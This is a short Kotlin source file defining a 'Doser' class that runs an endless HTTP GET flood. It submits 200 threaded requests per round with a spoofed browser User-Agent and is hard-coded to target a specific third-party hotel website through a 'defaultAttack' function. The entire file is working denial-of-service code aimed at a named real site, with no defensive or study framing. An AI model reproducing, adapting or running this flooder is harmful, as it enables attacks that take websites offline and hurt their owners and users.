/**
 * Created by bebe on 12/20/14.
 */

import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.ExecutorService
import java.util.ArrayList
import java.util.concurrent.Future
import java.net.HttpURLConnection

class Doser{
    fun attackResource(url: URL){
        val service: ExecutorService = Executors.newCachedThreadPool()
        val futures = ArrayList<Any>()
        while (true) {
            var i: Int = 0;
            while (i < 200) {
                i++;
                val r = Runnable {
                    val connection = url.openConnection()
                    if (connection is HttpURLConnection) {
                        connection.setDoOutput(true)
                        connection.setDoInput(true);
                        connection.setRequestMethod("GET");
                        connection.setRequestProperty("charset", "utf-8");
                        //                    connection.setRequestProperty("Host", "localhost");
                        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0");
                        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        //    connection.setRequestProperty("Content-Length", param);
                        System.out.println(" " + connection.getResponseCode());
                    }
                }
                futures.add(service.submit(r))
            }
            for (future in futures){
                (future as Future<Any>).get();
            }
        }
    }
}

fun Doser.defaultAttack(){
    attackResource(URL("http://villa-foros.com.ua/nomera/"))
}

//fun main(args: Array<String>) {
////    Doser().attackResource(URL("http://villa-foros.com.ua/nomera/"))
//    Doser().defaultAttack()
//}